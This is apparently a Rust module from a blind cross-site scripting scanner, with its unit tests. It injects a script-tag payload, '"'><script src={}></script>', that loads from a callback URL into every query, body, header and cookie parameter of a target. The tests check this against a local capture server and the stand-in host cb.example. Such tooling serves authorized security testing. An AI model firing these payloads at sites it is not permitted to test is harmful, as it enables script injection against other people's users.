use crate::target_parser::Target;

pub async fn blind_scanning(target: &Target, callback_url: &str) {
    let template = crate::payload::XSS_BLIND_PAYLOADS
        .first()
        .copied()
        .unwrap_or("\"'><script src={}></script>");
    let payload = template.replace("{}", callback_url);

    // Collect all params
    let mut all_params = vec![];

    // Query params
    for (k, v) in target.url.query_pairs() {
        all_params.push((k.to_string(), v.to_string(), "query".to_string()));
    }

    // Body params
    if let Some(data) = &target.data {
        for pair in data.split('&') {
            if let Some((k, v)) = pair.split_once('=') {
                all_params.push((k.to_string(), v.to_string(), "body".to_string()));
            }
        }
    }

    // Headers
    for (k, v) in &target.headers {
        all_params.push((k.to_string(), v.to_string(), "header".to_string()));
    }

    // Cookies
    for (k, v) in &target.cookies {
        all_params.push((k.to_string(), v.to_string(), "cookie".to_string()));
    }

    // Send requests for each param
    for (param_name, _, param_type) in all_params {
        send_blind_request(target, &param_name, &payload, &param_type).await;
    }
}

async fn send_blind_request(target: &Target, param_name: &str, payload: &str, param_type: &str) {
    use reqwest::Client;
    use tokio::time::{Duration, sleep};
    use url::form_urlencoded;
    // use global request counter: crate::REQUEST_COUNT

    let client = target.build_client().unwrap_or_else(|_| Client::new());

    let url = match param_type {
        "query" => {
            let mut pairs: Vec<(String, String)> = target
                .url
                .query_pairs()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect();
            let mut found = false;
            for pair in &mut pairs {
                if pair.0 == param_name {
                    pair.1 = payload.to_string();
                    found = true;
                    break;
                }
            }
            if !found {
                pairs.push((param_name.to_string(), payload.to_string()));
            }
            let query = form_urlencoded::Serializer::new(String::new())
                .extend_pairs(&pairs)
                .finish();
            let mut url = target.url.clone();
            url.set_query(Some(&query));
            url
        }
        "body" => target.url.clone(),
        "header" => target.url.clone(),
        "cookie" => target.url.clone(),
        _ => target.url.clone(),
    };

    let mut request = client.request(
        target.method.parse().unwrap_or(reqwest::Method::GET),
        url.clone(),
    );

    let mut headers = target.headers.clone();
    let mut cookies = target.cookies.clone();
    let mut body = target.data.clone();

    match param_type {
        "query" => {
            // Already handled in url
        }
        "body" => {
            if let Some(data) = &target.data {
                // Simple replace, assuming param=value& format
                body = Some(
                    data.replace(
                        &format!("{}=", param_name),
                        &format!("{}={}&", param_name, payload),
                    )
                    .trim_end_matches('&')
                    .to_string(),
                );
            }
        }
        "header" => {
            for (k, v) in &mut headers {
                if k == param_name {
                    *v = payload.to_string();
                }
            }
        }
        "cookie" => {
            for (k, v) in &mut cookies {
                if k == param_name {
                    *v = payload.to_string();
                }
            }
        }
        _ => {}
    }

    for (k, v) in &headers {
        request = request.header(k, v);
    }
    if let Some(ua) = &target.user_agent {
        request = request.header("User-Agent", ua);
    }
    let cookie_header = cookies
        .iter()
        .map(|(k, v)| format!("{}={}", k, v))
        .collect::<Vec<_>>()
        .join("; ");
    if !cookie_header.is_empty() {
        request = request.header("Cookie", cookie_header);
    }
    if let Some(b) = &body {
        request = request.body(b.clone());
    }

    // Send the request, ignore response
    crate::REQUEST_COUNT.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let _ = request.send().await;

    if target.delay > 0 {
        sleep(Duration::from_millis(target.delay)).await;
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use axum::{
        Router,
        body::{Body, to_bytes},
        extract::State,
        http::{Request, StatusCode},
        response::IntoResponse,
        routing::any,
    };
    use std::collections::HashMap;
    use std::net::{Ipv4Addr, SocketAddr};
    use std::sync::Arc;
    use tokio::sync::Mutex;
    use tokio::time::{Duration, sleep};

    #[derive(Clone, Debug)]
    struct CapturedRequest {
        method: String,
        uri: String,
        headers: HashMap<String, String>,
        body: String,
    }

    type CaptureState = Arc<Mutex<Vec<CapturedRequest>>>;

    async fn capture_handler(
        State(state): State<CaptureState>,
        request: Request<Body>,
    ) -> impl IntoResponse {
        let (parts, body) = request.into_parts();
        let bytes = to_bytes(body, usize::MAX).await.unwrap_or_default();
        let mut headers = HashMap::new();
        for (name, value) in &parts.headers {
            headers.insert(
                name.as_str().to_ascii_lowercase(),
                value.to_str().unwrap_or_default().to_string(),
            );
        }

        state.lock().await.push(CapturedRequest {
            method: parts.method.to_string(),
            uri: parts.uri.to_string(),
            headers,
            body: String::from_utf8_lossy(&bytes).to_string(),
        });
        StatusCode::OK
    }

    async fn start_capture_server() -> (SocketAddr, CaptureState) {
        let state: CaptureState = Arc::new(Mutex::new(Vec::new()));
        let app = Router::new()
            .route("/", any(capture_handler))
            .route("/submit", any(capture_handler))
            .with_state(state.clone());

        let listener = tokio::net::TcpListener::bind((Ipv4Addr::LOCALHOST, 0))
            .await
            .expect("bind listener");
        let addr = listener.local_addr().expect("listener addr");

        tokio::spawn(async move {
            let _ = axum::serve(listener, app).await;
        });

        sleep(Duration::from_millis(30)).await;
        (addr, state)
    }

    fn make_target(addr: SocketAddr, path: &str) -> Target {
        let target = format!("http://{}:{}{}", addr.ip(), addr.port(), path);
        crate::target_parser::parse_target(&target).expect("valid target")
    }

    #[tokio::test]
    async fn test_send_blind_request_query_injects_payload_and_keeps_existing_state() {
        let (addr, state) = start_capture_server().await;
        let mut target = make_target(addr, "/?q=seed&keep=1");
        target.headers = vec![("X-Test".to_string(), "header".to_string())];
        target.cookies = vec![("sid".to_string(), "abc".to_string())];
        target.user_agent = Some("dalfox-test".to_string());
        target.delay = 1;

        send_blind_request(&target, "q", "PAYLOAD", "query").await;

        let records = state.lock().await.clone();
        assert_eq!(records.len(), 1);
        let req = &records[0];
        assert_eq!(req.method, "GET");
        assert!(req.uri.contains("q=PAYLOAD"));
        assert!(req.uri.contains("keep=1"));
        assert_eq!(
            req.headers.get("x-test").map(String::as_str),
            Some("header")
        );
        assert_eq!(
            req.headers.get("user-agent").map(String::as_str),
            Some("dalfox-test")
        );
        assert!(
            req.headers
                .get("cookie")
                .map(|v| v.contains("sid=abc"))
                .unwrap_or(false)
        );
    }

    #[tokio::test]
    async fn test_send_blind_request_query_appends_when_param_missing() {
        let (addr, state) = start_capture_server().await;
        let target = make_target(addr, "/?keep=1");

        send_blind_request(&target, "q", "PAYLOAD", "query").await;

        let records = state.lock().await.clone();
        assert_eq!(records.len(), 1);
        let req = &records[0];
        assert!(req.uri.contains("keep=1"));
        assert!(req.uri.contains("q=PAYLOAD"));
    }

    #[tokio::test]
    async fn test_send_blind_request_mutates_body_header_and_cookie_targets() {
        let (addr, state) = start_capture_server().await;
        let mut target = make_target(addr, "/submit");
        target.method = "POST".to_string();
        target.data = Some("a=1&b=2".to_string());
        target.headers = vec![("X-Trace".to_string(), "old".to_string())];
        target.cookies = vec![("session".to_string(), "old".to_string())];

        send_blind_request(&target, "a", "BODYPAY", "body").await;
        send_blind_request(&target, "X-Trace", "HDRPAY", "header").await;
        send_blind_request(&target, "session", "CKPAY", "cookie").await;

        let records = state.lock().await.clone();
        assert_eq!(records.len(), 3);
        assert_eq!(records[0].method, "POST");
        assert!(records[0].body.contains("a=BODYPAY"));
        assert_eq!(
            records[1].headers.get("x-trace").map(String::as_str),
            Some("HDRPAY")
        );
        assert!(
            records[2]
                .headers
                .get("cookie")
                .map(|v| v.contains("session=CKPAY"))
                .unwrap_or(false)
        );
    }

    #[tokio::test]
    async fn test_send_blind_request_unknown_param_type_falls_back_to_default_path() {
        let (addr, state) = start_capture_server().await;
        let target = make_target(addr, "/");

        send_blind_request(&target, "unused", "PAYLOAD", "unknown-type").await;

        let records = state.lock().await.clone();
        assert_eq!(records.len(), 1);
        assert_eq!(records[0].uri, "/");
    }

    #[tokio::test]
    async fn test_blind_scanning_sends_requests_for_query_body_header_and_cookie() {
        let (addr, state) = start_capture_server().await;
        let mut target = make_target(addr, "/?q=1");
        target.method = "POST".to_string();
        target.data = Some("bodyp=2".to_string());
        target.headers = vec![("x-h".to_string(), "v".to_string())];
        target.cookies = vec![("c".to_string(), "3".to_string())];

        blind_scanning(&target, "https://cb.example").await;

        let records = state.lock().await.clone();
        assert_eq!(records.len(), 4);
        assert!(records.iter().all(|r| r.method == "POST"));
        assert!(records.iter().any(|r| {
            r.uri.contains("cb.example")
                || r.body.contains("cb.example")
                || r.headers.values().any(|v| v.contains("cb.example"))
        }));
    }
}
